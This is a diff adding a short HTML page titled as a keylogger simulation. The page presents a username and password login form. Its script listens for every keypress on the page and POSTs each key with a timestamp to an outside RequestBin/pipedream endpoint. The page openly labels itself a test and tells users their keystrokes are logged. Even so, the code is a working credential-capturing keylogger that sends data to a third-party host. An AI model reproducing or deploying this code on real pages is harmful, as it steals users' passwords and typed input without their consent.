@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test Page - Keylogger Simulation</title>
+</head>
+<body>
+    <h2>Test Form</h2>
+    <p>Type something in the text box below, and your keystrokes will be logged in RequestBin.</p>
+
+    <form>
+        <label for="username">Username:</label>
+        <input type="text" id="username" placeholder="Type your username"><br><br>
+
+        <label for="password">Password:</label>
+        <input type="password" id="password" placeholder="Type your password"><br><br>
+
+        <button type="submit">Login</button>
+    </form>
+
+    <script>
+        // Replace with your RequestBin URL
+        const requestBinUrl = 'https://eozzery4zjjic6l.m.pipedream.net';
+
+        // Keylogging simulation
+        document.addEventListener("keypress", function(event) {
+            // Send the captured keystroke to RequestBin using the URL
+            fetch(requestBinUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    key: event.key,
+                    timestamp: new Date().toISOString()
+                })
+            })
+            .then(response => response.json())
+            .then(data => console.log('Data sent:', data)) // Optional: Log success message
+            .catch(error => console.log('Error:', error));
+        });
+    </script>
+
+    <p>Check your RequestBin for the logged keystrokes.</p>
+</body>
+</html>
